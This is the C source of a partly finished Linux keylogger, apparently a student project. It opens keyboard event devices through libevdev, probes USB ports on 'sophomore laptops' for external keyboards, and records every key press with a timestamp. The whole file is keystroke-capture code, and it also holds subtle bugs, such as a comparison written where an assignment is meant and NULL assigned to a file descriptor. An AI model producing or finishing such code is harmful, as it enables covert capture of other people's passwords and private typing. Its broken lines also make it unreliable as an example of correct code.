/**
 * Local keylogging
 */

#include "keylogger.h"

// for keylogging
#define _POSIX_SOURCE
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <libevdev/libevdev.h>
#include <pthread.h>
#include <signal.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <time.h>
#include <unistd.h>

void begin_keylogger(void) {
  // IMPLEMENTATION HERE
}

void end_keylogger(void) {
  // IMPLEMENTATION HERE
}

// TODO: this currently doesn't work as expected, since it utilizes the device
// of the event. Event 0 represents the lid of the laptop
void log_device(key_package* key_package) {
  struct libevdev* dev;
  int rc;

  // open a new device from the file descriptor and initialize
  int fd = open("/dev/input/event0", O_RDONLY | O_NONBLOCK);
  if (fd < 0) {
    printf("error opening event0 %d\n", EXIT_FAILURE);
    fprintf(stderr, "error opening file: %d %s\n", errno, strerror(errno));
    exit(0);
  }
  rc = libevdev_new_from_fd(fd, &dev);
  if (rc < 0) {
    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
    exit(0);
  }

  // Use the getter functions to gather info about the device
  // printf("Device: %s | vendor: %x | product: %x\n", libevdev_get_name(dev),
  //        libevdev_get_id_vendor(dev), libevdev_get_id_product(dev));

  key_package->device_info = libevdev_get_name(dev);  // could prob include more info here. not sure how useful this is.

  // clean up
  libevdev_free(dev);
  close(fd);
}

void handle_syn_dropped(struct libevdev* dev) {
  struct input_event ev;
  int rc = LIBEVDEV_READ_STATUS_SYNC;

  while (rc == LIBEVDEV_READ_STATUS_SYNC) {
    rc = libevdev_next_event(dev, LIBEVDEV_READ_FLAG_SYNC, &ev);
    if (rc < 0) {
      if (rc != -EAGAIN) fprintf(stderr, "error %d (%s)\n", -rc, strerror(-rc));
      return;
    }

    printf("State change since SYN_DROPPED for %s %s value %d\n",
           libevdev_event_type_get_name(ev.type),
           libevdev_event_code_get_name(ev.type, ev.code), ev.value);
  }
}

void log_keys(key_package* key_package) {
  // http://who-t.blogspot.com/2013/09/libevdev-handling-input-events.html

  // open a device, as libevdev expects a file descriptor. You should have root
  // permissions
  struct libevdev* keyboard_dev;
  struct libevdev* external_keyboard_dev;
  int rc;

  // get keyboard inputs event file
  int keyboard_fd = open("/dev/input/event3", O_RDONLY | O_NONBLOCK);
  if (keyboard_fd < 0) {
    fprintf(stderr, "error opening event3 file: %d %s\n", errno,
            strerror(errno));
    exit(0);
  }
  rc = libevdev_new_from_fd(keyboard_fd, &keyboard_dev);
  if (rc < 0) {
    fprintf(stderr, "error with setting rc: %d %s\n", -rc, strerror(-rc));
    exit(0);
  }

  // check the 3 USB ports in the event they are external keyboards
  // On the sophomore laptops, 25 is the bottom right, 27 is the left, and 28 is the top right USB port
  int external_fd;
  for (size_t i = 0; i < 3; ++i) {
    // TODO: replace with better implementation
    char* event_path;
    if (i == 0) {
      event_path = "/dev/input/event25";
    } else if (i == 1) {
      event_path = "/dev/input/event27";
    } else if (i == 2) {
      event_path == "/dev/input/event28";
    }
    // printf("event path: %s\n", event_path);
    external_fd = open(event_path, O_RDONLY | O_NONBLOCK);

    if (external_fd < 0) {
      printf("No device found for %s\n", event_path);
      continue;
    }
    // check that the event is a keyboard. If so, exit this loop immediately
    rc = libevdev_new_from_fd(external_fd, &external_keyboard_dev);
    if (rc < 0) {
      fprintf(stderr, "error with setting rc for %s: %d %s\n", event_path, -rc, strerror(-rc));
      exit(0);
    }
    // check if the event represents a keyboard
    if (libevdev_has_event_type(external_keyboard_dev, EV_KEY) == 1) {
      printf("passed check 1\n");
      if (libevdev_has_event_code(external_keyboard_dev, EV_KEY, KEY_A)) {
        printf("%s is a keyboard\n", event_path);
        break;
      }
    }

    // if this is the third loop and there is no keyboard, set extrenal_fd = NULL
    if (i == 2) {
      printf("No external keyboards found.\n");
      external_fd = NULL;
    }
  }


  while (1) {
    struct input_event ev;

    // other options: LIBEVDEV_READ_FLAG_NORMAL
    rc = libevdev_next_event(keyboard_dev, LIBEVDEV_READ_FLAG_BLOCKING, &ev);
    if (rc < 0) {
      // note that this section runs when no event is occurring, NOT necessarily
      // when there is an error printf("value of rc: %d\n", rc);
      if (rc != -EAGAIN) printf("1 error: %d %s\n", -rc, strerror(-rc));
      // exit(0);
    } else if (rc == LIBEVDEV_READ_STATUS_SYNC) {
      printf("handling syn drop\n");
      handle_syn_dropped(keyboard_dev);
    } else if (rc == LIBEVDEV_READ_STATUS_SUCCESS) {
      // handle event here

      // each key press/lift generates 3 events: EV_MSC, EV_SYN, and EV_KEY
      // we only care about EV_KEY, represented by ev.type == 1
      if (ev.type == 1) {
        if (ev.value == 1 || ev.value == 2) {
          // get current time
          time_t rawtime;
          struct tm * timeinfo;
          time ( &rawtime );
          timeinfo = localtime ( &rawtime );

          // make key struct, add to key package. do the file writing in another file
          key_info pressed_key = {
            .key = libevdev_event_code_get_name(ev.type, ev.code),
            .timestamp = asctime(timeinfo)
          };

          // append to key_package->keys
          key_package->keys[key_package->keys_arr_size] = pressed_key;
          key_package->keys_arr_size++;

          // printf("New key_package array size: %ld\n", key_package->keys_arr_size);
        }
      }
    } else {
      printf("unsure of what is going on here..\n");
    }

    // TODO: change this. instead of writing to the file upon exiting
    // upon pressing "c" (represented by code 46), it should write to the
    // file every few seconds.
    if (ev.code == 46) {
      printf("exiting\n");

      break;
    }
  }

  // Clean up
  libevdev_free(keyboard_dev);
  close(keyboard_fd);
}

void print_logged_keys(key_package key_package) {
  printf("All keys in key_package struct: \n");

  for (size_t i = 0; i < key_package.keys_arr_size; i++) {
    printf("%s  ", key_package.keys[i].key);
  }
  printf("\n");
}
